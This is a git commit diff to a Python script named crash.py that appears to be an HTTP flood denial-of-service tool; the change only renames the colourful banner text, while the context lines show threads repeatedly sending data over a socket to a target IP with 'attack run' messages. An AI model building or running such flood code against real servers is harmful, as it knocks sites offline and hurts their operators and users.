29947f3d06de1f40b11fd6c6da68da22dc4e60e6
KunFay99 <kaffayukiffu@gmail.com>
2025-10-04 15:47:55 +0700

    Update crash.py

--- crash.py
+++ crash.py
@@ -84,7 +84,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *" \033[35mF A D H I L  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
+			print(i *" \033[35mC R A S H  \033[32mHTTP \033[33mFL00D  \033[96m" +str(ip)+ "\033[37m = \033[1mattack run\033[0m")
 		except:
 			s.close()
 			print(i +" \033[4mfinnaly run\033[0m")
@@ -100,10 +100,10 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i *" \036[4mBASE2  \033[37mHTTP flood  \033[35m" +str(ip)+ "::.... \033[0m")
+			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +str(ip)+ "::.... \033[0m")
 		except:
 			s.close()
-			print(i *" \036[33mBASE2  \033[37mHTTP flood  \033[4m" +str(ip)+ "::. \033[0m")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +str(ip)+ "::. \033[0m")
 							
             
 for y in range(threads):
